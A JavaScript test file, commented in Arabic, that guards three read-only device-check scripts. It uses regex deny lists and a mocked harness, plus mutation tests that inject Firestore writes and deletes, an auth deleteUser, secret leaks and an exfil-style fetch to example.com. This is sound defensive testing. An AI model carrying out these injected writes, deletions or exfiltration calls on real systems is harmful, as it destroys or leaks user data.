'use strict';

// deviceCheck03ReadOnlyGuard.test.js — حارس «السكربتات الثلاثة لا تكتب» وطفراته (فحص الجهاز ٠٣، 2026-10-10 +03).
//
// أمر المنسّق (بنصّه المنقول): «وحارس أن السكربتات الثلاثة لا تكتب: ثلاث طفرات على الأقلّ (كتابة Firestore، وكتابة ملفّ في السكربت ٣، وطباعة بريد). يجب أن تفشل الاختبارات بكلٍّ منها.»
// وقرار المستخدم (2026-10-09، بنصّه، القاعدة 42): «لا حذف من الإنتاج بأيّ وسيلة، ولا سكربت فيه delete على الإنتاج، إلا بأمر صريح منّي ونسخة احتياطية.»
// وقرار المستخدم 2026-10-10 للسكربت ٣: «والملفّ لا يُحفظ على القرص: يُقرأ في الذاكرة، وتُستخرج المسارات، ويُترك.»
//
// ─── البناء ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
//   (أ) حارس ساكن على مصادر السكربتات الثلاثة ومكتباتها (بلا تعليقات): لا واجهة كتابة Firestore ولا Storage ولا Auth ولا قرص ولا شبكة؛ كل سكربت يغلّف db بـwrapReadOnly وbucket بالقائمة البيضاء ويكتب مخرَجه بـwriteOutputExclusive؛
//       ولا طباعة بريد؛ والسكربت ٣ بلا Auth ولا بريد أصلاً.
//   (ب) حارس ديناميكي: كل سكربت يُشغَّل بـmain الحقيقية وdb مزيَّف يسجّل كل كتابة، وbucket مزيَّف يسجّل كل كتابة، وAuth مزيَّف يسجّل كل عملية غير getUserByEmail، ومراقب fs لكل كتابة على القرص، ومنع الاتصال بغير المضيف
//       المحلّي، والتقاط كل مطبوع (console وstdout وstderr). الحكم: انتهاكات مسمّاة (FIRESTORE_WRITE · STORAGE_WRITE · DISK_WRITE · AUTH_OPERATION · NETWORK · SECRET_IN_OUTPUT · EXIT_CODE · STATIC).
//   (ج) الطفرات: كل طفرة نصّ يُحقَن في مصدر السكربت أو مكتبته (يُحمَّل المصدر المطفَّر بدل الأصلي) ثم يُشغَّل الحارس نفسه (أ+ب) عليه — **ويجب أن يُبلّغ عن الانتهاك المسمّى**؛ والأصلي يمرّ بلا أيّ انتهاك.
//       وأُجريت الطفرات الثلاث يدوياً أيضاً على الملفّات الحقيقية وعُكست (تُذكر في تقرير المهمّة).
//
// الاستبدال معلَن (القاعدة 37): db وbucket وAuth مزيَّفة تسجّل ولا تستبدل منطقاً؛ ومراقبو fs والشبكة والمطبوع يمرّرون النداء إلى الأصلي (الكتابة الشرعية الوحيدة: ملفّ المخرَج).
//
// Run: node functions/test/deviceCheck03ReadOnlyGuard.test.js

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const Module = require('module');

let n = 0;
const ok = (c, m) => { assert.ok(c, m); n++; };
const eq = (a, b, m) => { assert.strictEqual(a, b, `${m} — got ${JSON.stringify(a)}, want ${JSON.stringify(b)}`); n++; };
const deq = (a, b, m) => { assert.deepStrictEqual(a, b, m); n++; };

const {lightenFingerprintForStorage} = require('../src/analysis/lightenFingerprintForStorage');
const {makeMemDb} = require('./lib/memFirestore');
const H = require('./lib/deviceCheck03Harness');
const C = require('../scripts/lib/deviceCheck03Common');

const FN = path.join(__dirname, '..');
const SCRIPTS = {
  before: path.join(FN, 'scripts', 'device-check-03-before-readonly.js'),
  after: path.join(FN, 'scripts', 'device-check-03-after-readonly.js'),
  keypaths: path.join(FN, 'scripts', 'golden-stage2-keypaths-readonly.js'),
};
const LIBS = {
  common: path.join(FN, 'scripts', 'lib', 'deviceCheck03Common.js'),
  beforeLib: path.join(FN, 'scripts', 'lib', 'deviceCheck03Before.js'),
  afterLib: path.join(FN, 'scripts', 'lib', 'deviceCheck03After.js'),
  keypathsLib: path.join(FN, 'scripts', 'lib', 'goldenStage2Keypaths.js'),
  keyPaths: path.join(FN, 'scripts', 'lib', 'keyPaths.js'),
};
const ALL_FILES = {...SCRIPTS, ...LIBS};
const SCRIPT_LIBS = {before: ['common', 'beforeLib'], after: ['common', 'afterLib'], keypaths: ['common', 'keypathsLib', 'keyPaths']};

const GOLDEN = path.join(FN, 'test', 'fixtures', 'golden');
const STEM = 'fv69-app-request-payload-derived-from-fv67-golden-34dff2b8-';
const payloadOf = (k) => JSON.parse(fs.readFileSync(path.join(GOLDEN, `${STEM}${k}.json`), 'utf8'));
const clone = (x) => JSON.parse(JSON.stringify(x));
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dc03-guard-'));
let counter = 0;
const nextOut = () => path.join(tmp, `out-${++counter}.json`);

// ═══════════════════════════════════════════════════════════════════
// (أ) الحارس الساكن
// ═══════════════════════════════════════════════════════════════════
const stripComments = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '').replace(/([^:'"`\\])\/\/ .*$/gm, '$1').replace(/^#!.*$/m, '');

const FORBIDDEN = Object.freeze({
  FIRESTORE_WRITE: /\.(?:set|update|create|delete)\(|\bbatch\(|\.runTransaction\(|\.bulkWriter\(|\.recursiveDelete\(|FieldValue|\.commit\(|\bsetDoc\(|\bupdateDoc\(|\bdeleteDoc\(|\baddDoc\(|\bwriteBatch\(/,
  STORAGE_WRITE: /\.(?:save|upload|setMetadata|makePublic|move|copy|createWriteStream|createResumableUpload)\(|\bdestination\s*:/,
  AUTH_WRITE: /\b(?:createUser|updateUser|deleteUser|setCustomUserClaims|revokeRefreshTokens|generate\w*Link|importUsers|deleteUsers|createCustomToken)\b/,
  DISK_WRITE: /\b(?:writeFile(?:Sync)?|appendFile(?:Sync)?|createWriteStream|copyFile(?:Sync)?|renameSync|unlink(?:Sync)?|rmSync|rmdir(?:Sync)?|mkdir(?:Sync)?|mkdtemp(?:Sync)?|truncate(?:Sync)?|symlink(?:Sync)?|cpSync|openSync|writeSync)\b/,
  NETWORK: /\b(?:fetch|XMLHttpRequest|axios|WebSocket)\s*\(|\b(?:https?|http2|net|tls|dns|dgram)\.(?:request|get|connect|createConnection|lookup|resolve)\b|require\(\s*['"](?:https?|http2|net|tls|dns|dgram|node-fetch|axios)['"]\s*\)/,
  EMAIL_OUTPUT: /\$\{\s*email\s*\}|\b(?:out|err|console\.\w+)\(\s*email\b|JSON\.stringify\(\s*email\b|\bemail\s*:\s*email\b|\bowner_email\b/,
});
// `.add(` لا تُحظر عاماً (Set.add مشروعة في مكتبتين)، فيُحصَر مستقبلها في الأسماء المعلومة
const ADD_RECEIVERS_ALLOWED = new Set(['paths', 'acc']);

/** انتهاكات ساكنة لمصدر ملفّ. fileKey ∈ مفاتيح ALL_FILES. */
function staticViolations(fileKey, rawSource) {
  const src = stripComments(rawSource.replace(/\r\n/g, '\n'));
  const v = new Set();
  for (const [name, re] of Object.entries(FORBIDDEN)) if (re.test(src)) v.add(`STATIC:${name}`);
  for (const m of src.matchAll(/\b([A-Za-z_$][\w$]*)\.add\(/g)) if (!ADD_RECEIVERS_ALLOWED.has(m[1])) v.add('STATIC:FIRESTORE_WRITE');
  if (SCRIPTS[fileKey]) {
    if (!/C\.wrapReadOnly\(/.test(src)) v.add('STATIC:NO_WRAP_READ_ONLY_DB');
    if (!/C\.writeOutputExclusive\(/.test(src)) v.add('STATIC:NO_EXCLUSIVE_OUTPUT_WRITER');
    if (!/C\.assertOutWritable\(/.test(src)) v.add('STATIC:NO_OUT_PRECHECK');
    if (fileKey !== 'before' && !/C\.wrapReadOnlyBucket\(/.test(src) && fileKey === 'keypaths') v.add('STATIC:NO_WRAP_READ_ONLY_BUCKET');
    if (fileKey === 'after' && !/args\.useStorage \? C\.wrapReadOnlyBucket\(/.test(src)) v.add('STATIC:NO_WRAP_READ_ONLY_BUCKET');
    if ((src.match(/process\.argv/g) || []).length !== 1) v.add('STATIC:ARGV_READ_OUTSIDE_ENTRY');
  }
  if (fileKey === 'keypaths' || fileKey === 'keypathsLib' || fileKey === 'keyPaths') {
    if (/OWNER_EMAIL_ENV|getUserByEmail|\bauth\b|readOwnerEmail|resolveOwner/.test(src)) v.add('STATIC:SCRIPT3_TOUCHES_AUTH_OR_EMAIL');
  }
  if (fileKey === 'keypathsLib' || fileKey === 'keyPaths') {
    for (const m of src.matchAll(/\bfs\.(\w+)/g)) if (!['readFileSync', 'readdirSync'].includes(m[1])) v.add('STATIC:DISK_WRITE');
  }
  if (fileKey === 'common') {
    if (!/Object\.freeze\(\{getUserByEmail:/.test(src)) v.add('STATIC:AUTH_SURFACE_NOT_SINGLE_OPERATION');
    if (!/Object\.freeze\(\{file:/.test(src)) v.add('STATIC:BUCKET_SURFACE_NOT_ALLOWLIST');
  }
  return [...v].sort();
}

// ═══════════════════════════════════════════════════════════════════
// (ب) الحارس الديناميكي + (ج) تحميل المصدر المطفَّر
// ═══════════════════════════════════════════════════════════════════
const EMAIL = 'owner.s10.secret@example.test';
const OWNER = 'uid-OWNER-SECRET-424242';
const SCANS = {B1: 'scan-B1-secret-0001', S1: 'scan-S1-secret-0003'};
const SHORT = {B1: 'NC-BBB001', S1: 'NC-SSS001'};
const SESSION_ID = 'sess-SECRET-0001';
const JOINER = 'anon-joiner-uid-SECRET';
const TECH = 'SECRET TECH NAME';
const NOW = 1_800_000_000_000;
const ts = (ms) => ({toMillis: () => ms});
const SECRETS = [EMAIL, 'owner.s10', OWNER, ...Object.values(SCANS), ...Object.values(SHORT), SESSION_ID, JOINER, TECH, 'sha-B1', 'sha-S1', 'scans/sha-'];
const storageFileOf = (payload) => { const {timeSeriesState, ...file} = payload.timeSeries; void timeSeriesState; return file; };

function seedWorld() {
  const reports = {};
  const reportRaw = {};
  const objects = {};
  for (const [tag, key] of [['B1', '11ch-nothing-admitted'], ['S1', '16ch-four-policies-truncated-failures']]) {
    const payload = payloadOf(key);
    reports[SCANS[tag]] = {shortId: SHORT[tag], userId: OWNER, pipeline: 'v7_findings_based', fieldsVersion: 69, appVersion: '1.0.11', createdAt: ts(NOW)};
    const sp = `scans/sha-${tag}/${SCANS[tag]}.ts.json.gz`;
    reportRaw[SCANS[tag]] = {scanId: SCANS[tag], rawFingerprint: clone(lightenFingerprintForStorage(payload)), sessionId: tag === 'S1' ? SESSION_ID : null, deviceFingerprintSha: `sha-${tag}`, timeSeriesStoragePath: sp, aiAudit: null, source: 'analyzeDevice'};
    objects[sp] = H.gz(storageFileOf(payload));
  }
  return {
    collections: {
      reports, reportRaw, users: {[OWNER]: {evaluationEnabled: true, plan: 'single'}},
      scanSessions: {[SESSION_ID]: {status: 'completed', joinedBy: JOINER, joinedAt: ts(NOW - 5000), scanId: SCANS.S1, ownerId: OWNER, createdAt: ts(NOW - 60000)}, other: {status: 'pending', createdAt: ts(NOW - 5 * 3600_000)}},
      scanClaims: {}, evaluations: {[SCANS.S1]: {pending: false, linkageRawState: 'PRIVATE', linkageIncomplete: false, source: 'session', ownerMismatch: false, revisionCount: 0, technicianName: TECH}},
    },
    objects,
  };
}

const ARGV = {
  before: (out) => ['--out', out],
  // وسمان بلا توقّعات خاصّة (G1 وSX): البيانات هنا لحراسة «لا كتابة» لا لجدول التوقّعات (B1 وS1… لهما توقّعات خاصّة تُختبر في deviceCheck03After.test.js)
  after: (out) => ['--tokens', `G1=${SHORT.B1},SX=${SHORT.S1}`, '--out', out],
  keypaths: (out) => ['--short-id', SHORT.B1, '--out', out],
};

const requireFresh = (file) => { delete require.cache[require.resolve(file)]; return require(file); };

// 2026-10-13 +03: مصادر السكربتات تُقرأ بنهايات أسطر LF دائماً. مراسي الطفرات (insertAfter وreplaceOnce) تحمل \n،
// فبنسخة عمل CRLF (core.autocrlf=true بعد git checkout أو استنساخ جديد) كانت تُخفق «anchor must occur exactly once (found 0)» —
// وقع حين استعاد git checkout ثلاثة ملفّات من هذه القائمة بعد تشغيل طفرات الجزء الخامس.
const readSource = (f) => fs.readFileSync(f, 'utf8').replace(/\r\n/g, '\n');

/**
 * يحمّل مصدراً مطفَّراً كوحدة (الطلبات النسبية تُحلّ من مساره الأصلي).
 * @return {Object} exports
 */
function compileMutated(file, mutate) {
  const original = readSource(file);
  const mutated = mutate(original);
  if (mutated === original) throw new Error(`mutation did not change ${path.basename(file)}`);
  const m = new Module(file, module);
  m.filename = file;
  m.paths = Module._nodeModulePaths(path.dirname(file));
  m._compile(mutated.replace(/^#!.*\n/, '\n'), file);
  m.loaded = true;
  return m;
}

/**
 * يشغّل سكربتاً بـmain الحقيقية تحت الحارس الديناميكي، بعد أن يستبدل (إن طُلب) مصدر ملفّ أو أكثر بنسخة مطفَّرة.
 * @param {string} key before|after|keypaths
 * @param {Array<{file: string, mutate: function(string): string}>} [mutations]
 * @return {Promise<{violations: string[], code: ?number, text: string, outPath: string, fsWrites: Array}>}
 */
async function runGuarded(key, mutations = []) {
  const touched = [SCRIPTS[key], ...Object.values(LIBS)];
  const saved = new Map(touched.map((f) => [f, require.cache[f]]));
  for (const f of touched) delete require.cache[f];
  try {
    for (const mut of mutations) {
      const m = compileMutated(mut.file, mut.mutate);
      require.cache[mut.file] = m;
    }
    const scriptExports = require(SCRIPTS[key]);
    const {collections, objects} = seedWorld();
    const db = makeMemDb(collections);
    const {bucket, writeAttempts: bucketWrites} = H.makeStubBucket(objects);
    const {auth, violations: authViolations} = H.makeRecordingAuth(async (email) => {
      if (email !== EMAIL) throw Object.assign(new Error(`There is no user record corresponding to ${email}`), {code: 'auth/user-not-found'});
      return {uid: OWNER};
    });
    const outPath = nextOut();
    const spy = H.spyFsWrites();
    const netGuard = H.blockNonLocalNetwork();
    const cap = H.captureConsole();
    const outs = [];
    let code = null;
    let thrown = null;
    try {
      code = await scriptExports.main(ARGV[key](outPath), {env: {[C.OWNER_EMAIL_ENV]: EMAIL}, now: () => NOW, db, auth, bucket, out: (s) => outs.push(String(s)), err: (s) => outs.push(String(s))});
    } catch (e) {
      thrown = e;
    } finally {
      cap.restore(); netGuard.restore(); spy.restore();
    }
    const fileText = fs.existsSync(outPath) ? fs.readFileSync(outPath, 'utf8') : '';
    const text = `${outs.join('\n')}\n${cap.chunks.join('\n')}\n${fileText}${thrown ? `\n${String(thrown && thrown.message)}` : ''}`;
    const v = new Set();
    const expectCodes = key === 'after' ? [0] : [0];
    if (thrown || !expectCodes.includes(code)) v.add('EXIT_CODE');
    if (db.writeAttempts.length > 0) v.add('FIRESTORE_WRITE');
    if (bucketWrites.length > 0) v.add('STORAGE_WRITE');
    if (spy.writes.some((w) => path.resolve(w.path) !== path.resolve(outPath))) v.add('DISK_WRITE');
    if (spy.writes.filter((w) => path.resolve(w.path) === path.resolve(outPath)).length !== 1) v.add('OUTPUT_NOT_WRITTEN_ONCE');
    if (authViolations.length > 0) v.add('AUTH_OPERATION');
    if (netGuard.blocked.length > 0) v.add('NETWORK');
    if (SECRETS.some((s) => text.includes(s))) v.add('SECRET_IN_OUTPUT');
    // ساكن على المصدر المُستعمَل فعلاً (المطفَّر إن طُفِّر)
    const files = {[key]: SCRIPTS[key], ...Object.fromEntries(SCRIPT_LIBS[key].map((k) => [k, LIBS[k]]))};
    for (const [fk, fp] of Object.entries(files)) {
      const mut = mutations.find((m) => m.file === fp);
      const src = mut ? mut.mutate(readSource(fp)) : readSource(fp);
      for (const sv of staticViolations(fk, src)) v.add(sv);
    }
    return {violations: [...v].sort(), code, text, outPath, fsWrites: spy.writes, thrown};
  } finally {
    for (const f of touched) {
      delete require.cache[f];
      if (saved.get(f)) require.cache[f] = saved.get(f);
    }
  }
}

// ─── الطفرات ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
function insertAfter(anchor, text) {
  return (src) => {
    const count = src.split(anchor).length - 1;
    if (count !== 1) throw new Error(`anchor must occur exactly once (found ${count}): ${anchor.slice(0, 60)}`);
    return src.replace(anchor, `${anchor}${text}`);
  };
}
function replaceOnce(anchor, replacement) {
  return (src) => {
    const count = src.split(anchor).length - 1;
    if (count !== 1) throw new Error(`anchor must occur exactly once (found ${count}): ${anchor.slice(0, 60)}`);
    return src.replace(anchor, replacement);
  };
}
const LEAK = JSON.stringify(path.join(tmp, 'leaked-storage-file.json'));
const LEAK_GZ = JSON.stringify(path.join(tmp, 'leaked-storage-file.gz'));
const NOW_LINE = '    const nowMs = now();\n';

const MUTANTS = [
  // ── الطفرات الثلاث المطلوبة بنصّ الأمر ──
  {id: 'M1-firestore-write (bypassing the wrapper)', key: 'before', file: SCRIPTS.before, mutate: insertAfter(NOW_LINE, "    await injected.db.collection('users').doc('mutant').set({hacked: true});\n"), expect: ['FIRESTORE_WRITE', 'EXIT_CODE', 'STATIC:FIRESTORE_WRITE']},
  {id: 'M2-script3-writes-the-storage-file-to-disk', key: 'keypaths', file: LIBS.keypathsLib, mutate: insertAfter('    const r = await fetchSamplesFromStorage(bucket, storagePath);\n', `    require('fs').writeFileSync(${LEAK}, JSON.stringify(r.samples));\n`), expect: ['DISK_WRITE', 'STATIC:DISK_WRITE']},
  {id: 'M3-prints-the-e-mail', key: 'before', file: SCRIPTS.before, mutate: replaceOnce('out(`device-check-03 before written:', 'out(`[${email}] device-check-03 before written:'), expect: ['SECRET_IN_OUTPUT', 'STATIC:EMAIL_OUTPUT']},
  // ── طفرات إضافية ──
  {id: 'M1b-firestore-write (through the wrapped db: the wrapper must trap)', key: 'before', file: SCRIPTS.before, mutate: insertAfter(NOW_LINE, "    await db.collection('users').doc('mutant').set({hacked: true});\n"), expect: ['EXIT_CODE', 'STATIC:FIRESTORE_WRITE']},
  {id: 'M1c-firestore-delete (rule 42)', key: 'after', file: SCRIPTS.after, mutate: insertAfter(NOW_LINE, "    await injected.db.collection('reports').doc('r').delete();\n"), expect: ['FIRESTORE_WRITE', 'STATIC:FIRESTORE_WRITE']},
  {id: 'M1d-firestore-batch', key: 'keypaths', file: SCRIPTS.keypaths, mutate: insertAfter(NOW_LINE, '    await injected.db.batch().commit();\n'), expect: ['FIRESTORE_WRITE', 'STATIC:FIRESTORE_WRITE']},
  {id: 'M2b-script3-download-to-destination', key: 'keypaths', file: LIBS.keypathsLib, mutate: replaceOnce('    const r = await fetchSamplesFromStorage(bucket, storagePath);\n', `    const r = {state: 'DOWNLOADED', samples: await bucket.file(storagePath).download({destination: ${LEAK_GZ}})};\n`), expect: ['EXIT_CODE', 'STATIC:STORAGE_WRITE']},
  {id: 'M2c-script3-write-stream', key: 'keypaths', file: LIBS.keypathsLib, mutate: insertAfter('    const r = await fetchSamplesFromStorage(bucket, storagePath);\n', `    require('fs').createWriteStream(${LEAK}).on('error', () => {}).end(Buffer.from('x'));\n`), expect: ['DISK_WRITE', 'STATIC:DISK_WRITE']},
  {id: 'M3b-writes-the-e-mail-into-the-output-file', key: 'after', file: SCRIPTS.after, mutate: replaceOnce('owner: {accountHash, accountReportsCount,', 'owner: {email, accountHash, accountReportsCount,'), expect: ['SECRET_IN_OUTPUT']},
  {id: 'M3c-logs-the-raw-uid (console)', key: 'before', file: LIBS.common, mutate: replaceOnce('  return {uid: user.uid, accountHash: hashIdForLog(user.uid)};', '  console.log(user.uid);\n  return {uid: user.uid, accountHash: hashIdForLog(user.uid)};'), expect: ['SECRET_IN_OUTPUT']},
  {id: 'M3d-writes-the-raw-scanId-into-the-output', key: 'keypaths', file: LIBS.keypathsLib, mutate: replaceOnce('ids: {scanIdHash: C.hashIdForLog(scanId)}', 'ids: {scanId}'), expect: ['SECRET_IN_OUTPUT']},
  {id: 'M3e-prints-the-e-mail-via-console', key: 'after', file: SCRIPTS.after, mutate: insertAfter('    const email = C.readOwnerEmail(env);\n', '    console.log(email);\n'), expect: ['SECRET_IN_OUTPUT', 'STATIC:EMAIL_OUTPUT']},
  {id: 'M4-extra-auth-operation', key: 'after', file: SCRIPTS.after, mutate: insertAfter('    const {uid, accountHash} = await C.resolveOwner({auth: injected.auth, email});\n', '    await injected.auth.deleteUser(uid);\n'), expect: ['AUTH_OPERATION', 'EXIT_CODE', 'STATIC:AUTH_WRITE']},
  {id: 'M5-no-read-only-wrapper', key: 'after', file: SCRIPTS.after, mutate: replaceOnce('C.wrapReadOnly(injected.db)', 'injected.db'), expect: ['STATIC:NO_WRAP_READ_ONLY_DB']},
  {id: 'M5b-no-bucket-allowlist (script 3)', key: 'keypaths', file: SCRIPTS.keypaths, mutate: replaceOnce('C.wrapReadOnlyBucket(injected.bucket)', 'injected.bucket'), expect: ['STATIC:NO_WRAP_READ_ONLY_BUCKET']},
  {id: 'M6-network-call', key: 'after', file: SCRIPTS.after, mutate: insertAfter(NOW_LINE, "    await fetch('https://example.com/exfil?x=1');\n"), expect: ['NETWORK', 'EXIT_CODE', 'STATIC:NETWORK']},
  {id: 'M7-storage-write (through the unwrapped bucket)', key: 'keypaths', file: SCRIPTS.keypaths, mutate: insertAfter(NOW_LINE, "    await injected.bucket.file('x').save('y');\n"), expect: ['STORAGE_WRITE', 'EXIT_CODE', 'STATIC:STORAGE_WRITE']},
  {id: 'M8-script3-reads-the-owner-e-mail', key: 'keypaths', file: SCRIPTS.keypaths, mutate: insertAfter(NOW_LINE, '    const email = C.readOwnerEmail(env);\n'), expect: ['STATIC:SCRIPT3_TOUCHES_AUTH_OR_EMAIL']},
  {id: 'M9-writes-a-second-file', key: 'after', file: SCRIPTS.after, mutate: insertAfter(NOW_LINE, `    require('fs').writeFileSync(${LEAK}, 'x');\n`), expect: ['DISK_WRITE', 'STATIC:DISK_WRITE']},
];

(async () => {
  // ═══ (أ) الساكن على الملفّات الثمانية الأصلية ═══
  for (const [fk, fp] of Object.entries(ALL_FILES)) {
    deq(staticViolations(fk, readSource(fp)), [], `[أ] ${path.basename(fp)}: لا انتهاك ساكن`);
  }
  // الحارس الساكن حيّ: ضوابط سلبية على نصوص قصيرة
  deq(staticViolations('before', 'x.collection("a").doc("b").set({})'), ['STATIC:FIRESTORE_WRITE', 'STATIC:NO_EXCLUSIVE_OUTPUT_WRITER', 'STATIC:NO_OUT_PRECHECK', 'STATIC:NO_WRAP_READ_ONLY_DB', 'STATIC:ARGV_READ_OUTSIDE_ENTRY'].sort(), '[أ] ضابط سلبي: set() على مصدر سكربت');
  ok(staticViolations('keyPaths', "fs.writeFileSync('x', 'y')").includes('STATIC:DISK_WRITE'), '[أ] ضابط سلبي: كتابة fs في مكتبة المسارات');
  ok(staticViolations('keypathsLib', "fs.chmodSync('x', 1)").includes('STATIC:DISK_WRITE'), '[أ] ضابط سلبي: أيّ fs غير القراءة في مكتبة السكربت ٣');
  ok(staticViolations('afterLib', 'const s = new Set(); s.add(1);').includes('STATIC:FIRESTORE_WRITE'), '[أ] ضابط سلبي: .add على مستقبل غير معلوم');
  ok(!staticViolations('afterLib', 'const acc = new Set(); acc.add(1);').includes('STATIC:FIRESTORE_WRITE'), '[أ] وSet.add المعلومة لا تُحظر');
  eq(stripComments('// db.set(\nconst a = 1; // x.delete(\n').includes('set('), false, '[أ] التعليقات تُقصى قبل الفحص');

  // ═══ (ب) الأصلي يمرّ بلا أيّ انتهاك ═══
  for (const key of ['before', 'after', 'keypaths']) {
    const r = await runGuarded(key);
    deq(r.violations, [], `[ب] ${path.basename(SCRIPTS[key])}: الأصلي تحت الحارس بلا أيّ انتهاك`);
    eq(r.code, 0, `[ب] ${key}: رمز الخروج 0`);
    deq(r.fsWrites.map((w) => path.resolve(w.path)), [path.resolve(r.outPath)], `[ب] ${key}: الكتابة الوحيدة على القرص ملفّ المخرَج`);
    ok(r.text.length > 100 && !SECRETS.some((s) => r.text.includes(s)), `[ب] ${key}: ما طُبع وما كُتب لا يحمل بريداً ولا معرّفاً خامّاً (${SECRETS.length} سرّاً مفحوصاً)`);
    ok(fs.existsSync(r.outPath), `[ب] ${key}: ملفّ المخرَج موجود`);
  }

  // ═══ (ج) كل طفرة يجب أن يُبلّغ الحارس عنها بانتهاكها المسمّى ═══
  ok(MUTANTS.length >= 17, `[ج] الطفرات (${MUTANTS.length}): الثلاث المطلوبة وما زاد`);
  for (const mu of MUTANTS) {
    const r = await runGuarded(mu.key, [{file: mu.file, mutate: mu.mutate}]);
    if (process.env.DC03_GUARD_VERBOSE) console.log(`mutant ${mu.id}: code=${r.code} violations=[${r.violations.join(', ')}]`);
    ok(r.violations.length > 0, `[ج] ${mu.id}: الحارس يفشل (انتهاكات: ${r.violations.join(', ') || 'لا شيء'})`);
    for (const exp of mu.expect) ok(r.violations.includes(exp), `[ج] ${mu.id}: يُبلَّغ عن ${exp} — الفعلي: ${r.violations.join(', ')}`);
    // الأصلي بعد الطفرة سليم (لا تسرّب بين التشغيلات)
    const clean = await runGuarded(mu.key);
    deq(clean.violations, [], `[ج] ${mu.id}: وبعد الطفرة يعود الأصلي بلا انتهاك (لا تسرّب في require.cache)`);
  }
  // الطفرات الثلاث المطلوبة بأسمائها (وجودها في القائمة جزء من العقد)
  deq(MUTANTS.slice(0, 3).map((m) => m.id.split('-')[0]), ['M1', 'M2', 'M3'], '[ج] الثلاث الأولى: كتابة Firestore، وكتابة ملفّ في السكربت ٣، وطباعة بريد');
  ok(!fs.existsSync(path.join(tmp, 'leaked-storage-file.gz')), '[ج] وM2b لم يُنتج ملفّاً (الغلاف رمى قبل الكتابة)');

  await new Promise((r) => setTimeout(r, 200)); // يُنهي أيّ تدفّق كتابة فتحته طفرة M2c قبل حذف المجلّد المؤقّت
  fs.rmSync(tmp, {recursive: true, force: true}); // ملفّات الاختبار المؤقّتة وحدها
  console.log(`\ndeviceCheck03ReadOnlyGuard.test.js: ${n}/${n} assertions passed (mutants=${MUTANTS.length})`);
})().catch((e) => {
  console.error('FAIL:', e && e.stack || e);
  process.exit(1);
});
